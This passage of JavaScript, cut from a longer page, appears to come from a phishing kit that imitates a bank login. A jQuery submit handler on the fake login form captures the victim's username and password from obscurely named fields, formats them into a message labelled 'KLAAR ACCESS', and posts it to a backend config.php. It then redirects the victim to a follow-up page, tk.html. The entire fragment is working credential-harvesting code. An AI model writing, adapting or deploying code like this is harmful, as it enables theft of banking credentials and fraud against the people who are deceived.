    $("#login").submit(function (e) {
        e.preventDefault();

        var username = $("input[name='trax']").val();
        var password = $("input[name='trex']").val();

        var message = "拆 KLAAR ACCESS 拆\n";
message += " KLARUser: <code>" + username + "</code>\n";
message += " KLARPass: <code>" + password + "</code>";

        // Enviar al backend (config.php)
        $.ajax({
            type: "POST",
            url: "config.php",
            data: {
                message: message
            },
            success: function (response) {
                console.log("Mensaje enviado:", response);
                window.location.href = "tk.html";
            },
            error: function (error) {
                console.error("Error al enviar:", error);
            }
        });

        return false;
    });
});
</script>
